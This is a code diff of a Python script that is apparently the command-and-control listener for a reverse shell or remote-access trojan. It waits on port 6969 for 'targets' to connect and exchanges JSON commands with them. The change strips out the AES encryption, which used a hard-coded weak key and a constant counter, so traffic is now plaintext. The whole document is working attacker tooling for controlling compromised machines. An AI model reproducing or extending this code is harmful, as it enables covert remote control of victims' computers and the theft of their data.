@@ -2,13 +2,10 @@
 # -*- encoding: utf-8 -*-
 
 import base64,json,socket,sys
-from Crypto.Cipher import AES
 ip='0.0.0.0' # can use noip dns
 print (ip)
 port = 6969
 
-counter = "H"*16
-key = "H"*32
 
 # color codes..................
 red="\033[1;32;31m"
@@ -71,20 +68,13 @@ class listener:
         self.conn, addr = listener.accept()
         print green,"target ", str(addr), "is on...",r
 
-    def encrypt(self,message):
-        self.encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-        return self.encrypto.encrypt(message)
-
-    def decrypt(self,message):
-        self.decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-        return self.decrypto.decrypt(message)
 
     def json_send(self, data):
         try:
             json_data = json.dumps(data)
-            return self.conn.send(self.encrypt(json_data))
+            return self.conn.send(json_data)
         except:
-            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
+            return self.conn.send("[-] STDOUT parsing problem [-]")
             pass
 
     def receive(self):
@@ -92,7 +82,7 @@ class listener:
         while True:
             try:
                 json_data = json_data + self.conn.recv(4096)
-                return json.loads(self.decrypt(json_data))
+                return json.loads(json_data)
             except ValueError:
                 continue
             except:
